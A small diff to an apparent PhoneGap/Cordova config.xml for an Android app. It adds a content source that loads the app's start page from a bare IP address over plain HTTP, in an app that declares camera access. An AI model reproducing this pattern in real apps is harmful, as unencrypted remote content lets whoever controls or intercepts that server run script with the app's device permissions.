@@ -16,6 +16,9 @@
     <author href="https://build.phonegap.com" email="support@phonegap.com">
         rotorgames
     </author>
+	
+	<content src="http://213.219.244.158/pg/" />
+	
 	<gap:platform name="android" />
 	<preference name="phonegap-version" value="3.1.0" />
 	<feature name="Camera">
